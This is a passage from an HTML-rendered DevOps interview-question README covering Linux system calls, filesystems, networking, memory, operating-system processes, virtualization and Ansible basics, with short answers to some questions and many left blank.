&lt;h4&gt;&lt;a id="user-content-system-calls" class="anchor" aria-hidden="true" href="#system-calls"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;System Calls&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain the fork system call&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;fork() is used for creating a new process. It does so by cloning the calling process but the child process has its own PID and any memory locks, I/O operations and semaphores are not inherited.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain the exec system call&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the differences between exec() and fork()?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Why do we need the wait system call?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;wait() is used by a parent process to wait for the child process to finish execution.
If wait is not used by a parent process then a child process might become a zombie process.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What execve() does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Executes a program. The program is passed as a filename (or path) and must be a binary executable or a script.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What happens when you execute &lt;code&gt;ls -l&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Shell reads the input using getline() which reads the input file stream and stores into a buffer as a string&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The buffer is broken down into tokens and stored in an array this way: {"ls", "-l", "NULL"}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Shell checks if an expansion is required (in case of ls *.c)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Once the program in memory, its execution starts. First by calling readdir()&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Notes:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;getline() originates in GNU C library and used to read lines from input stream and stores those lines in the buffer
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What happens when you execute &lt;code&gt;ls -l *.log&lt;/code&gt;?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What readdir() system call does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-linux-filesystem--files" class="anchor" aria-hidden="true" href="#linux-filesystem--files"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux Filesystem &amp;amp; Files&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to create a file of a certain size?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;There are a couple of ways to do that:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;dd if=/dev/urandom of=new_file.txt bs=2MB count=1&lt;/li&gt;
&lt;li&gt;truncate -s 2M new_file.txt&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;fallocate -l 2097152 new_file.txt
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Can you describe how processes are being created?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What does the following block do?:
&lt;pre&gt;&lt;code&gt;open("/my/file") = 5
read(5, "file content")
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;These system calls are reading the file &lt;code&gt;/my/file&lt;/code&gt; and 5 is the file descriptor number.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What system call is used for listing files?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What system call is used for creating a new process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between a process and a thread?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You found there is a server with high CPU load but you didn't find a process with high CPU. How is that possible?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-linux-networking" class="anchor" aria-hidden="true" href="#linux-networking"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux Networking&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;When you run &lt;code&gt;ip a&lt;/code&gt; you see there is a device called 'lo'. What is it and why do we need it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What the &lt;code&gt;traceroute&lt;/code&gt; command does? How does it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Another common way to task this questions is "what part of the tcp header does traceroute modify?"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is network bonding? What types are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to link two separate network namespaces so you can ping an interface on one namespace from the second one?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are cgroups?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Process Descriptor and Task Structure&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are the differences between threads and processes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Kernel Threads&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What happens when socket system call is used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This is a good article about the topic: &lt;a href="https://ops.tips/blog/how-linux-creates-sockets" rel="nofollow"&gt;https://ops.tips/blog/how-linux-creates-sockets&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;You executed a script and while still running, it got accidentally removed. Is it possible to restore the script while it's still running?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-memory" class="anchor" aria-hidden="true" href="#memory"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Memory&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between MemFree and MemAvailable in /proc/meminfo?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;MemFree - The amount of unused physical RAM in your system
MemAvailable - The amount of available memory for new workloads (without pushing system to use swap) based on MemFree, Active(file), Inactive(file), and SReclaimable.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-operating-system" class="anchor" aria-hidden="true" href="#operating-system"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Operating System&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-operating-system-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-6" class="anchor" aria-hidden="true" href="#baby-beginner-6"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is an operating system?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;There are many ways to answer that. For those who look for simplicity, the book "Operating Systems: Three Easy Pieces" offers nice version:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;"responsible for making it easy to run programs (even allowing you to seemingly run many at the same time), allowing programs to share memory, enabling programs to interact with devices, and other fun stuff like that"
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-processes-1" class="anchor" aria-hidden="true" href="#processes-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Processes&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Can you explain what is a process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A process is a running program. A program is one or more instructions and the program (or process) is executed by the operating system.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;If you had to design an API for processes in an operating system, what would this API look like?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;It would support the following:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Create - allow to create new processes&lt;/li&gt;
&lt;li&gt;Delete - allow to remove/destroy processes&lt;/li&gt;
&lt;li&gt;State - allow to check the state of the process, whether it's running, stopped, waiting, etc.&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Stop - allow to stop a running process
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How a process is created?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;ul&gt;
&lt;li&gt;The OS is reading program's code and any additional relevant data&lt;/li&gt;
&lt;li&gt;Program's bytes are loaded into the memory or more specifically, into the address space of the process.&lt;/li&gt;
&lt;li&gt;Memory is allocated for program's stack (aka run-time stack). The stack also initialized by the OS with data like argv, argc and parameters to main()&lt;/li&gt;
&lt;li&gt;Memory is allocated for program's heap which is required for data structures like linked lists and hash tables&lt;/li&gt;
&lt;li&gt;I/O initialization tasks like in Unix/Linux based systems where each process has 3 file descriptors (input, output and error)&lt;/li&gt;
&lt;li&gt;OS is running the program, strarting from main()&lt;/li&gt;
&lt;/ul&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Note: The loading of the program's code into the memory done lazily which means the OS loads only partial relevant pieces required for the process to run and not the entire code.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? The loading of the program into the memory is done eagerly (all at once)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;False. It was true in the past but today's operating systems perform lazy loading which means only the relevant pieces required for the process to run are loaded first.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are different states of a process?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Running - it's executing instructions&lt;/li&gt;
&lt;li&gt;Ready - it's ready to run but for different reasons it's on hold&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Blocked - it's waiting for some operation to complete. For example I/O disk request
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;h4&gt;&lt;a id="user-content-concurrency" class="anchor" aria-hidden="true" href="#concurrency"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Concurrency&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Semaphore and what its role in operating systems&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-memory-1" class="anchor" aria-hidden="true" href="#memory-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Memory&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is cache? What is buffer?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Buffer: Reserved place in RAM which is used to hold data for temporary purposes
Cache: Cache is usually used when processes reading and writing to the disk to make the process faster by making similar data used by different programs easily accessible.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-virtualization" class="anchor" aria-hidden="true" href="#virtualization"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Virtualization&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-virtualization-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-7" class="anchor" aria-hidden="true" href="#baby-beginner-7"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Virtualization&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is "time sharing"?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Even when using a system with one physical CPU, it's possible to allow multiple users to work on it and run programs. This is possible with time sharing where computing resources are shared in a way it seems to the user the system has multiple CPUs but in fact it's simply one CPU shared by applying multiprogramming and multi-tasking.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is "space sharing"?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Somewhat the opposite of time sharing. While in time sharing a resource is used for a while by one entity and then the same resource can be used by another resource, in space sharing the space is shared by multiple entities but in a way it's not being transfered between them.&lt;br&gt;
It's used by one entity until this entity decides to get rid of it. Take for example storage. In storage, a file is your until you decide to delete it.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-ansible" class="anchor" aria-hidden="true" href="#ansible"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ansible&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-ansible-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-8" class="anchor" aria-hidden="true" href="#baby-beginner-8"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Describe each of the following components in Ansible, including the relationship between them:
&lt;ul&gt;
&lt;li&gt;Task&lt;/li&gt;
&lt;li&gt;Module&lt;/li&gt;
&lt;li&gt;Play&lt;/li&gt;
&lt;li&gt;Playbook&lt;/li&gt;
&lt;li&gt;Role&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;

&lt;p&gt;Task – a call to a specific Ansible module
Module – the actual unit of code executed by Ansible on your own host or a remote host. Modules are indexed by category (database, file, network, …) and also referred as task plugins.&lt;/p&gt;
&lt;p&gt;Play – One or more tasks executed on a given host(s)&lt;/p&gt;
&lt;p&gt;Playbook – One or more plays. Each play can be executed on the same or different hosts&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Role – Ansible roles allows you to group resources based on certain functionality/service such that they can be easily reused. In a role, you have directories for variables, defaults, files, templates, handlers, tasks, and metadata. You can then use the role by simply specifying it in your playbook.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How Ansible is different from other Automation tools?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Ansible is:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Agent-less&lt;/li&gt;
&lt;li&gt;Minimal run requirements (Python &amp;amp; SSH) and simple to use&lt;/li&gt;
&lt;li&gt;Default mode is "push" (it supports also pull)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Focus on simpleness and ease-of-use
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What kind of automation you wouldn't do with Ansible and why?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an inventory file and how do you define one?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;An inventory file defines hosts and/or groups of hosts on which Ansible tasks executed upon.&lt;/p&gt;
&lt;p&gt;An example of inventory file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;192.168.1.2
192.168.1.3
192.168.1.4

[web_servers]
190.40.2.20
190.40.2.21
190.40.2.22
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is a dynamic inventory file? When you would use one?&lt;/summary&gt;&lt;br&gt;&lt;br&gt;
&lt;p&gt;A dynamic inventory file tracks hosts from one or more sources like cloud providers and CMDB systems.&lt;/p&gt;
&lt;p&gt;You should use one when using external sources and especially when the hosts in your environment are being automatically&lt;br&gt;
spun up and shut down, without you tracking every change in these sources.
&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How do you list all modules and how can you see details on a specific module?&lt;/summary&gt;&lt;br&gt;&lt;br&gt;
&lt;ol&gt;
&lt;li&gt;Ansible online docs&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ansible-doc -l&lt;/code&gt; for list of modules and &lt;code&gt;ansible [module_name]&lt;/code&gt; for detailed information on a specific module
&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Write a task to create the directory ‘/tmp/new_directory’&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;- name: Create a new directory
  file:
    path: "/tmp/new_directory"
    state: directory
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
